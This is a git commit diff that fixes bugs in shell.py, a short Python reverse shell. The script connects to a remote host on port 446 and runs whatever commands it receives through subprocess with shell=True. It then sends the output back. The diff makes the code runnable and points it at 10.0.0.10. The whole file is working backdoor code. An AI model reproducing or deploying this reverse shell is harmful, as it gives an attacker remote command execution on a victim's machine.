666c89d3995bc280651e84de51ea30343e956c8d
stejp96 <stejp96@gmail.com>
2013-07-05 23:36:19 +0200

    Fixed errors

--- shell.py
+++ shell.py
@@ -2,21 +2,19 @@
 
 import subprocess, socket
 
-HOST =  "localhost"
+HOST =  "10.0.0.10"
 PORT = 446
 
-s = socket.socket(socket.AF_INET, socket.STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.connect((HOST, PORT))
 s.send("Hello World!")
 
-While True:
-	data = s.recv(1024)
-	if data == "quit":break
-	
-	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	stdoutput = proc.stdout.read() + proc.stderr.read()
-	
-	s.send(stdoutput)
-s.send("Bye")
+while True:
+    data = s.recv(1024)
+    if data == "quit ": s.send("ddasdas")
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdoutput = proc.stdout.read() + proc.stderr.read()
+    s.send(stdoutput)
+
 s.close()
